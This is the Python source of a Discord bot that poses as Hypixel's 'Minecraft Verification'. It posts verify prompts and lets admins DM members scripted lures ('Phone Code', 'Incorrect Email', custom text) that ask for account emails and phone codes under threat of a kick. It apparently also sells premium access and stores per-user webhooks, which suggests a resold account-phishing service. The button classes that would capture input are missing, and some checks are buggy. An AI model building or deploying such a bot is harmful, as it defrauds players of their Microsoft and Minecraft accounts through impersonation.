import discord, asqlite, asyncio, json
import os
import datetime, time
import asyncio
import psutil
import fnmatch
import platform
import config
import threading
import requests
import random
import urllib.request
import re
from discord.ext import commands
from rich.console import Console
from typing import Literal, Optional
from discord import ui
from discord.interactions import Interaction
from discord.ui import button, View, Button
from discord import app_commands
from typing import Optional, Union
from typing import List



cmd = Console()

with open("config.json") as r:
    r = json.load(r)

    DhookChannel = r["DhookChannelID"]
    Owners = r["Owners"]
    token = r["BotToken"]
    WhitelistedServers = r["WhitelistedServersIDs"]
    PremiumRoleID = r["PremiumRoleID"]
    VerifyRoleID = r["VerifyRoleID"]

class PersistentViewBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True

        super().__init__(command_prefix=commands.when_mentioned_or('.'), intents=intents, status=discord.Status.online)

    async def on_ready(self):
        print(f'Logged in as {self.user} (ID: {self.user.id})')

bot = PersistentViewBot()

bot.help_command = None


discord.utils.setup_logging()

tree = bot.tree

@bot.command()
@commands.has_permissions(administrator=True)
async def roleall(ctx, *, role: discord.Role):
    Embed = discord.Embed(title = f"Assigning Role", description=f"Attempting to assign all members to the provided role.", color=discord.Color.from_rgb(43, 45, 49))
    Embed.set_thumbnail(url="https://media.discordapp.net/attachments/1055946547185057874/1122285796083372183/image.png?width=259&height=255")
    Embed.timestamp = datetime.datetime.now()
    Embed.set_footer(text="Designed by Ices")
    await ctx.reply(embed=Embed)
    try:
        for member in ctx.guild.members:
            await member.add_roles(role)
    except:
        embed = discord.Embed(title=f"Error", description=f"Failed to assign role!\n\nTry moving my role above the role you want to assign to all members.", color=0xFC4431)
        embed.timestamp = datetime.datetime.now()
        embed.set_footer(text="Designed by Ices")
        await ctx.reply(embed=embed)
        return
    Embed = discord.Embed(title = f"Success", description=f"I have successfully assigned all members that role!", color=discord.Color.from_rgb(76, 165, 89))
    Embed.set_thumbnail(url="https://media.discordapp.net/attachments/1055946547185057874/1122285796083372183/image.png?width=259&height=255")
    Embed.timestamp = datetime.datetime.now()
    Embed.set_footer(text="Designed by Ices")
    await ctx.reply(embed=Embed)

@bot.command()
async def setverify(ctx: commands.Context):
    Embed = discord.Embed(title = f" Minecraft Verification", description=f"To gain access to `{ctx.guild.name}` you must verify your Minecraft account with Hypixel. If you do not verify you will be temporarily kicked from the server. To start the verification process click the verify button below.", color=discord.Color.from_rgb(43, 45, 49))
    Embed.set_thumbnail(url="https://media.discordapp.net/attachments/1055946547185057874/1122285796083372183/image.png?width=259&height=255")
    Embed.timestamp = datetime.datetime.now()
    Embed.set_footer(text=".gg/hypixel")

    view = discord.ui.View()
    view.add_item(item=VerifyButton())
    await ctx.send(embed=Embed, view=view)

@bot.command()
@commands.has_permissions(administrator=True)
async def help(ctx):
    embed  = discord.Embed(title=f"Hypixel Verify", description=f"**`•`** `.dm` `(ID, @user, username)` - Sends a Direct Message to the user provided.\n**`•`** `.roleall` `(@role, rolename)` - Adds all users in the server the command was ran in to the role provided.\n**`•`** `.setverify` - Sends the verify message to the channel the command was ran in.", color=discord.Color.from_rgb(43, 45, 49))
    embed.set_footer(text="Designed by Ices")
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/1055946547185057874/1122285796083372183/image.png?width=259&height=255")
    embed.timestamp = datetime.datetime.now()
    await ctx.reply(embed=embed, mention_author=False)

@bot.command()
@commands.has_permissions(administrator=True)
async def dm(ctx, user: discord.User):
    global usermsg
    global message3
    global user_id
    usermsg = user
    user_id = user.id
    avatar = user.avatar

    class Select(discord.ui.Select):
        def __init__(self):
            options=[
                discord.SelectOption(label="Phone Code"),
                discord.SelectOption(label="Incorrect Email"),
                discord.SelectOption(label="Custom")
            ]
            super().__init__(max_values=1, min_values=1, options=options)

        async def callback(self, interaction1: discord.Interaction):
            if self.values[0] == "Phone Code":
                embed1 = discord.Embed(title=f"<:hypixel512px:1144678935028842596> Minecraft Phone Verification", color=discord.Color.from_rgb(43, 45, 49), description=f"To gain access to `{ctx.guild.name}` you must verify your Minecraft account with Hypixel using a phone code. If you do not verify you will be temporarily kicked from the server. To start the verification process click the verify button below.")
                view = discord.ui.View()
                embed1.set_thumbnail(url="https://media.discordapp.net/attachments/1055946547185057874/1122285796083372183/image.png?width=259&height=255")
                view.add_item(item=PhoneButton())
                embed1.timestamp = datetime.datetime.now()
                embed1.set_footer(text=".gg/hypixel")
                await user.send(embed=embed1, view=view)

                embed  = discord.Embed(title=f"Message Sent", description=f"Successfully sent a `Phone Code` message to <@{user_id}>.", color=discord.Color.from_rgb(43, 45, 49))
                embed.timestamp = datetime.datetime.now()
                embed.set_thumbnail(url="https://media.discordapp.net/attachments/1055946547185057874/1122285796083372183/image.png?width=259&height=255")
                embed.set_author(name = f"{user.name}", icon_url = user.display_avatar.url)
                embed.set_footer(text="Designed by Ices")
                await interaction1.response.edit_message(embed=embed, view=None)
            elif self.values[0] == "Incorrect Email":
                embed1 = discord.Embed(title=f"<:hypixel512px:1144678935028842596> Invalid Email", color=0xff0000, description=f"The email you provided is incorrect. Please provide the email linked to your Minecraft account and check for any spelling errors.")
                view = discord.ui.View()
                view.add_item(item=VerifyButton())
                embed1.timestamp = datetime.datetime.now()
                embed1.set_footer(text=".gg/hypixel")
                await user.send(embed=embed1, view=view)

                embed  = discord.Embed(title=f"Message Sent", description=f"Successfully sent a `Incorrect Email` message to <@{user_id}>.", color=discord.Color.from_rgb(43, 45, 49))
                embed.timestamp = datetime.datetime.now()
                embed.set_thumbnail(url="https://media.discordapp.net/attachments/1055946547185057874/1122285796083372183/image.png?width=259&height=255")
                embed.set_author(name = f"{user.name}", icon_url = user.display_avatar.url)
                embed.set_footer(text="Designed by Ices")
                await interaction1.response.edit_message(embed=embed, view=None)
            elif self.values[0] == "Custom":
                await interaction1.response.send_modal(my_modal4())
            
    class SelectView(discord.ui.View):
        def __init__(self, *, timeout = 300):
            super().__init__(timeout=timeout)
            self.add_item(Select())
    
    Embed = discord.Embed(title = f"Direct Message", description=f"Please select an option to send to <@{user_id}>", color=discord.Color.from_rgb(43, 45, 49))
    Embed.set_author(name = f"{user.name}", icon_url = user.display_avatar.url)
    Embed.set_thumbnail(url="https://media.discordapp.net/attachments/1055946547185057874/1122285796083372183/image.png?width=259&height=255")
    Embed.timestamp = datetime.datetime.now()
    Embed.set_footer(text="Designed by Ices")
    message3 = await ctx.reply(embed=Embed, view=SelectView())
    await asyncio.sleep(400)
    try:
        await message3.edit(view=None)
    except:
        pass

class my_modal4(ui.Modal, title="Custom Message"):
    answer = ui.TextInput(label="Embed Title", style=discord.TextStyle.short, placeholder="Enter the title for the embed message.", required=True)
    answer2 = ui.TextInput(label="Embed Description", style=discord.TextStyle.short, placeholder="Enter the title for the embed description.", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        print(f"{self.answer.label}: {self.answer}")
        print(f"{self.answer2.label}: {self.answer2}")

        Embed = discord.Embed(title = f"<:hypixel512px:1144678935028842596> {self.answer.value}", description=f"{self.answer2.value}", color=discord.Color.from_rgb(43, 45, 49))
        Embed.set_thumbnail(url="https://media.discordapp.net/attachments/1055946547185057874/1122285796083372183/image.png?width=259&height=255")
        Embed.timestamp = datetime.datetime.now()
        Embed.set_footer(text=".gg/hypixel")
        await usermsg.send(embed=Embed)

        Embed = discord.Embed(title=f"Message Sent", description=f"Successfully sent a `Custom` message to <@{user_id}>.", color=discord.Color.from_rgb(43, 45, 49))
        Embed.set_thumbnail(url="https://media.discordapp.net/attachments/1055946547185057874/1122285796083372183/image.png?width=259&height=255")
        Embed.set_author(name = f"{usermsg.name}", icon_url = usermsg.display_avatar.url)
        Embed.add_field(name=f" {self.answer}", value=f"```{self.answer2}```", inline=False)
        Embed.timestamp = datetime.datetime.now()
        Embed.set_footer(text="Designed by Ices")
        await message3.edit(embed=Embed, view=None)
        await interaction.response.defer()

@bot.event
async def on_member_join(member):
    role = discord.utils.get(member.guild.roles, name='Unverified')
    await member.add_roles(role)
    def welcome_message1():
        time.sleep(3)  # Wait for 5 seconds
        welcome_channel_id = 1159215081528246432
        welcome_message = f"Welcome, {member.mention}! Verify to gain access to all channels at <#1133213067048652861>."
        welcome_channel = bot.get_channel(welcome_channel_id)
        asyncio.run_coroutine_threadsafe(welcome_channel.send(welcome_message), bot.loop)

    thread = threading.Thread(target=welcome_message1)
    thread.start()

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title=f"Missing Permission", description=f"You do not have permission to run this command.", color=0xFC4431)
        embed.timestamp = datetime.datetime.now()
        embed.set_footer(text="Designed by Ices")
        await ctx.reply(embed=embed)

@bot.command(hidden=True)
async def sync(ctx: commands.Context, guilds: commands.Greedy[discord.Object], spec: Optional[Literal["~", "*", "^"]] = None) -> None:
    if ctx.author.id not in Owners:
        return
    if not guilds:
        if spec == "~":
            synced = await ctx.bot.tree.sync(guild=ctx.guild)
        elif spec == "*":
            ctx.bot.tree.copy_global_to(guild=ctx.guild)
            synced = await ctx.bot.tree.sync(guild=ctx.guild)
        elif spec == "^":
            ctx.bot.tree.clear_commands(guild=ctx.guild)
            await ctx.bot.tree.sync(guild=ctx.guild)
            synced = []
        else:
            synced = await ctx.bot.tree.sync()

        await ctx.send(
            f"Synced {len(synced)} commands {'globally' if spec is None else 'to the current guild.'}"
        )
        return

    ret = 0
    for guild in guilds:
        try:
            await ctx.bot.tree.sync(guild=guild)
        except discord.HTTPException:
            pass
        else:
            ret += 1

    await ctx.send(f"Synced the tree to {ret}/{len(guilds)}.")


# ------------------------------------------------------------------------------------------------------- # 


@tree.command(name='premium')
async def premium(interaction: discord.Interaction, member: discord.Member):
    if interaction.user.id not in Owners:
        embed = discord.Embed(title = 'You cannot use this command in this server.')
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    async with asqlite.connect('database/database.db') as conn:
        await conn.execute("INSERT OR REPLACE INTO premium VALUES (?, ?)", (True, int(member.id)))
        await conn.commit()
        await member.add_roles(interaction.guild.get_role(PremiumRoleID))
        embed = discord.Embed(title=f"Gave {member.name} premium ✅")
        await interaction.response.send_message(embed=embed, ephemeral=True)

@tree.command()
async def profile(interaction: discord.Interaction, member: discord.Member=None):
    if interaction.guild.id not in WhitelistedServers:
        embed = discord.Embed(title = 'You cannot use this command in this server.')
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    interaction.user if member is None else member

    async with asqlite.connect('database/database.db') as conn:
        e = await conn.fetchone("SELECT * FROM premium WHERE UserID = ?", (int(member.id)))
        r = await conn.fetchone("SELECT * FROM webhooks WHERE UserID = ?", (int(member.id)))


    embed = discord.Embed(title=f"{member.name}'s Profile")
    embed.add_field(name='Premium', value='```False```' if e is None else '```True```')

    if r is None:
        await interaction.response.send_message(embed=embed, view=Remove_Premium(member), ephemeral=True) if e is not None else await interaction.response.send_message(embed=embed, ephemeral=True)
    else:
        await interaction.response.send_message(embed=embed, view=Both(member), ephemeral=True) if e is not None else await interaction.response.send_message(embed=embed, view=Show_webhook(member), ephemeral=True)


class Show_webhook(discord.ui.View):
    def __init__(self, member: discord.Member):
        super().__init__(timeout=None)
        self.member = member
    
    @discord.ui.button(label='Webhook', style=discord.ButtonStyle.gray, custom_id='webhook')
    async def Confirm(self, interaction: discord.Interaction, button: discord.Button):
        if interaction.guild.id in WhitelistedServers:
            if interaction.user.guild_permissions.administrator == True:
                async with asqlite.connect('database/database.db') as conn:
                    r = await conn.fetchone("SELECT * FROM webhooks WHERE UserID = ?", (int(self.member.id)))
                    if r is None:
                        embed = discord.Embed(title='Webhook does not exist.')
                        await interaction.response.send_message(embed=embed, ephemeral=True)
                        return
                    embed = discord.Embed(title=f"{self.member.display_name}'s Webhook", description=f"```{r[0]}```")
                await interaction.response.send_message(embed=embed, view=Delete_webhook(self.member), ephemeral=True)
            else:
                embed = discord.Embed('You are missing permissions to view this webhook. ❌')
                await interaction.response.send_message(embed=embed)
        else:
            embed = discord.Embed(title='You cannot use this in this server. ❌')
            await interaction.response.send_message(embed=embed, ephemeral=True)

class Both(discord.ui.View):
    def __init__(self, member: discord.Member):
        super().__init__(timeout=None)
        self.member = member
    
    @discord.ui.button(label='Webhook', style=discord.ButtonStyle.gray, custom_id='webhook')
    async def Confirm(self, interaction: discord.Interaction, button: discord.Button):
        if interaction.guild.id not in WhitelistedServers:
            if interaction.user.guild_permissions.administrator == True:
                async with asqlite.connect('database/database.db') as conn:
                    r = await conn.fetchone("SELECT * FROM webhooks WHERE UserID = ?", (int(self.member.id)))
                    if r is None:
                        embed = discord.Embed(title='Webhook does not exist.')
                        await interaction.response.send_message(embed=embed, ephemeral=True)
                        return
                    embed = discord.Embed(title=f"{self.member.display_name}'s Webhook", description=f"```{r[0]}```")
                await interaction.response.send_message(embed=embed, view=Delete_webhook(self.member), ephemeral=True)
            else:
                embed = discord.Embed('You are missing permissions to view this webhook. ❌')
                await interaction.response.send_message(embed=embed)
        else:
            embed = discord.Embed(title='You cannot use this in this server. ❌')
            await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label='Remove Premium', style=discord.ButtonStyle.red, custom_id='remove_premium')
    async def Remove(self, interaction: discord.Interaction, button: discord.Button):
        if interaction.guild.id in WhitelistedServers:
            if interaction.user.guild_permissions.administrator == True:
                async with asqlite.connect('database/database.db') as conn:
                    r = await conn.fetchone("SELECT * FROM premium WHERE UserID = ?", (int(self.member.id)))
                    if r is None:
                        embed = discord.Embed(title='User does not have premium. ❌')
                        await interaction.response.send_message(embed=embed, ephemeral=True)
                        return
                    else:
                        async with asqlite.connect('database/database.db') as conn:
                            await conn.execute("DELETE FROM premium WHERE UserID = ?", (int(self.member.id)))
                            await self.member.remove_roles(interaction.guild.get_role(PremiumRoleID))
                            embed = discord.Embed(title=f'Removed premium from {self.member.display_name}')
                            await interaction.response.send_message(embed=embed, ephemeral=True)
            else:
                embed = discord.Embed('You are missing permissions to do this. ❌')
                await interaction.response.send_message(embed=embed)
        else:
            embed = discord.Embed(title='You cannot use this in this server. ❌')
            await interaction.response.send_message(embed=embed, ephemeral=True)

class Delete_webhook(discord.ui.View):
    def __init__(self, member: discord.Member):
        super().__init__(timeout=None)
        self.member = member
    
    @discord.ui.button(label='Delete', style=discord.ButtonStyle.red, custom_id='delete')
    async def Delete(self, interaction: discord.Interaction, button: discord.Button):
        async with asqlite.connect('database/database.db') as conn:
            r = await conn.fetchone("SELECT * FROM webhooks WHERE UserID = ?", (int(self.member.id)))

        if r is None:
            embed = discord.Embed(title='Webhook does not exist.')
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        async with asqlite.connect('database/database.db') as conn:
            await conn.execute("DELETE FROM webhooks WHERE UserID = ?", (int(self.member.id)))
            embed = discord.Embed(title="Webhook has been deleted. ✅")
        await interaction.response.send_message(embed=embed, ephemeral=True)

class Remove_Premium(discord.ui.View):
    def __init__(self, member: discord.Member):
        super().__init__(timeout=None)
        self.member = member
    
    @discord.ui.button(label='Remove Premium', style=discord.ButtonStyle.red, custom_id='remove_premium')
    async def Remove(self, interaction: discord.Interaction, button: discord.Button):
        if interaction.guild.id in WhitelistedServers:
            if interaction.user.guild_permissions.administrator == True:
                async with asqlite.connect('database/database.db') as conn:
                    r = await conn.fetchone("SELECT * FROM premium WHERE UserID = ?", (int(self.member.id)))
                    if r is None:
                        embed = discord.Embed(title='User does not have premium.')
                        await interaction.response.send_message(embed=embed, ephemeral=True)
                        return
                    else:
                        async with asqlite.connect('database/database.db') as conn:
                            await conn.execute("DELETE FROM premium WHERE UserID = ?", (int(self.member.id)))
                            await self.member.remove_roles(interaction.guild.get_role(PremiumRoleID))
                            embed = discord.Embed(title=f'Removed premium from {self.member.display_name}')
                            await interaction.response.send_message(embed=embed, ephemeral=True)
            else:
                embed = discord.Embed('You are missing permissions to do this. ❌')
                await interaction.response.send_message(embed=embed)
        else:
            embed = discord.Embed(title='You cannot use this in this server. ❌')
            await interaction.response.send_message(embed=embed, ephemeral=True)

@tree.command()
async def verify(interaction: discord.Interaction, member: discord.Member):
    if interaction.guild.id not in WhitelistedServers:
        embed = discord.Embed(title = 'You cannot use this command in this server.')
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await member.add_roles(interaction.guild.get_role(VerifyRoleID))
    embed = discord.Embed(title='✅ Verified', description=f"**{member.name}** has been successfully been manually verified.")
    await interaction.response.send_message(embed=embed, ephemeral=True)



async def main():
    await bot.start(token)

asyncio.run(main())